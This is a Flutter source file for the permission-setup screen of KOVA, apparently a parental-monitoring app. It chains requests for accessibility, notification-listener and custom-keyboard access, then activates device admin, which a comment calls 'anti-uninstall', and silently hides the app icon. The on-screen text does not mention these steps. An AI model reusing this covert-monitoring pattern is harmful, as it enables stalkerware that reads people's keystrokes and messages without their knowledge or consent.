import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:kova/core/router.dart';
import '../theme/kova_theme.dart';
import '../services/accessibility_service.dart';

class AccessibilitySetupScreen extends StatefulWidget {
  const AccessibilitySetupScreen({super.key});

  @override
  State<AccessibilitySetupScreen> createState() =>
      _AccessibilitySetupScreenState();
}

class _AccessibilitySetupScreenState extends State<AccessibilitySetupScreen>
    with WidgetsBindingObserver {
  bool _isChecking = false;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _checkPermissionStatus();

    // Automatically prompt after screen loads
    Future.delayed(const Duration(milliseconds: 1000), () {
      if (mounted && !_isChecking) {
        _showInstructionsBottomSheet(context);
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _checkPermissionStatus();
    }
  }

  bool _askedNotification = false;
  bool _askedKeyboardEnable = false;
  bool _askedKeyboardSelect = false;
  bool _askedDeviceAdmin = false;
  bool _protectionStarted = false;

  Future<void> _checkPermissionStatus() async {
    // ── Step 1: Accessibility Service ──
    final isAccGranted = await AccessibilityService.isAccessibilityPermissionGranted();
    
    if (!isAccGranted) {
      return; // Keep waiting for accessibility
    }

    // ── Step 2: Notification Listener ──
    final isNotifGranted = await AccessibilityService.isNotificationListenerEnabled();
    
    if (!isNotifGranted) {
      if (!_askedNotification && mounted) {
        _askedNotification = true;
        Future.delayed(const Duration(milliseconds: 500), () {
            if (mounted) AccessibilityService.requestNotificationListenerPermission();
        });
      }
      return; // Keep waiting for notification access
    }

    // ── Step 3: KOVA Keyboard ──
    final isKeyboardEnabled = await AccessibilityService.isKeyboardEnabled();

    if (!isKeyboardEnabled) {
      if (!_askedKeyboardEnable && mounted) {
        _askedKeyboardEnable = true;
        Future.delayed(const Duration(milliseconds: 500), () {
          if (mounted) AccessibilityService.requestKeyboardPermission();
        });
      } else if (_askedKeyboardEnable && !_askedKeyboardSelect && mounted) {
        _askedKeyboardSelect = true;
        Future.delayed(const Duration(milliseconds: 500), () {
          if (mounted) AccessibilityService.showKeyboardPicker();
        });
      }
      return; // Keep waiting for keyboard
    }

    // ── Step 4: Device Admin (anti-uninstall) ──
    if (!_askedDeviceAdmin && mounted) {
      _askedDeviceAdmin = true;
      Future.delayed(const Duration(milliseconds: 500), () {
        if (mounted) AccessibilityService.activateDeviceAdmin();
      });
      return; // Wait for user to confirm device admin prompt
    }

    // ── Step 5: Start protection + hide icon (silent, no UI needed) ──
    if (!_protectionStarted && mounted) {
      _protectionStarted = true;
      await AccessibilityService.startProtectionService();
      await AccessibilityService.hideAppIcon();
    }

    // ── All services active — proceed to dashboard ──
    if (mounted) {
      context.go(AppRoutes.childDashboard);
    }
  }

  Future<void> _requestPermission() async {
    setState(() => _isChecking = true);
    await AccessibilityService.requestAccessibilityPermission();
    setState(() => _isChecking = false);
    
    // In debug mode, if you need to bypass because the native service 
    // is not fully compiled in the emulator, uncomment the following:
    // await Future.delayed(const Duration(seconds: 1));
    // if (mounted) context.go(AppRoutes.childMonitoredApps);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_rounded, color: Colors.black87),
          onPressed: () => context.pop(),
        ),
      ),
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 24.0, vertical: 16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                "Configure KOVA",
                style: GoogleFonts.inter(
                  fontSize: 28,
                  fontWeight: FontWeight.w700,
                  color: const Color(0xFF0F172A), // Slate 900
                  letterSpacing: -0.5,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                "To protect your child, KOVA needs accessibility permissions. This allows us to:",
                style: GoogleFonts.inter(
                  fontSize: 16,
                  height: 1.5,
                  fontWeight: FontWeight.w400,
                  color: const Color(0xFF475569), // Slate 600
                ),
              ),
              const SizedBox(height: 32),

              // Feature list
              const _SetupFeatureItem(
                icon: Icons.chat_bubble_outline_rounded,
                text: "Monitor social networks in real-time",
              ),
              const SizedBox(height: 24),
              const _SetupFeatureItem(
                icon: Icons.warning_amber_rounded,
                text: "Detect inappropriate content",
              ),
              const SizedBox(height: 24),
              const _SetupFeatureItem(
                icon: Icons.block_flipped,
                text: "Block dangerous apps",
              ),

              const Spacer(),

              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: _isChecking
                      ? null
                      : () => _showInstructionsBottomSheet(context),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: KovaTheme.primaryBlue,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(vertical: 18),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    elevation: 0,
                  ),
                  child: _isChecking
                      ? const SizedBox(
                          height: 24,
                          width: 24,
                          child: CircularProgressIndicator(
                            color: Colors.white,
                            strokeWidth: 2,
                          ),
                        )
                      : Text(
                          "Grant permissions",
                          style: GoogleFonts.inter(
                            fontSize: 16,
                            fontWeight: FontWeight.w600,
                            letterSpacing: 0.5,
                          ),
                        ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showInstructionsBottomSheet(BuildContext context) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (context) {
        return Container(
          decoration: const BoxDecoration(
            color: Color(0xFF1E293B), // Slate 800
            borderRadius: BorderRadius.vertical(top: Radius.circular(24.0)),
          ),
          padding: const EdgeInsets.fromLTRB(24.0, 32.0, 24.0, 48.0),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'How to enable Accessibility',
                style: GoogleFonts.inter(
                  fontSize: 20,
                  fontWeight: FontWeight.w700,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: 24),
              _buildInstructionStep(
                '1',
                'Find KOVA in ',
                '\'Downloaded apps\'',
              ),
              const SizedBox(height: 16),
              _buildInstructionStep('2', 'Tap the switch to ', 'turn it on'),
              const SizedBox(height: 16),
              _buildInstructionStep('3', 'Check ', '\'Allow\' to confirm'),
              const SizedBox(height: 32),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: () {
                    Navigator.pop(context); // Close bottom sheet
                    _requestPermission();
                  },
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.white,
                    foregroundColor: const Color(0xFF1E293B), // Slate 800
                    padding: const EdgeInsets.symmetric(vertical: 16),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    elevation: 0,
                  ),
                  child: Text(
                    "Go to Settings",
                    style: GoogleFonts.inter(
                      fontSize: 16,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildInstructionStep(String number, String text1, String highlight) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Container(
          width: 24,
          height: 24,
          decoration: BoxDecoration(
            color: Colors.white.withValues(alpha: 0.1),
            shape: BoxShape.circle,
          ),
          alignment: Alignment.center,
          child: Text(
            number,
            style: GoogleFonts.inter(
              fontSize: 14,
              color: Colors.white,
              fontWeight: FontWeight.w600,
            ),
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: RichText(
            text: TextSpan(
              style: GoogleFonts.inter(
                fontSize: 15,
                color: const Color(0xFF94A3B8), // Slate 400
              ),
              children: [
                TextSpan(text: text1),
                TextSpan(
                  text: highlight,
                  style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ],
            ),
          ),
        ),
      ],
    );
  }
}

class _SetupFeatureItem extends StatelessWidget {
  final IconData icon;
  final String text;

  const _SetupFeatureItem({required this.icon, required this.text});

  @override
  Widget build(BuildContext context) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.center,
      children: [
        Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: KovaTheme.primaryBlue.withValues(alpha: 0.1),
            shape: BoxShape.circle,
          ),
          child: Icon(icon, color: KovaTheme.primaryBlue, size: 24),
        ),
        const SizedBox(width: 16),
        Expanded(
          child: Text(
            text,
            style: GoogleFonts.inter(
              fontSize: 15,
              fontWeight: FontWeight.w500,
              color: const Color(0xFF1E293B),
            ),
          ),
        ),
      ],
    );
  }
}
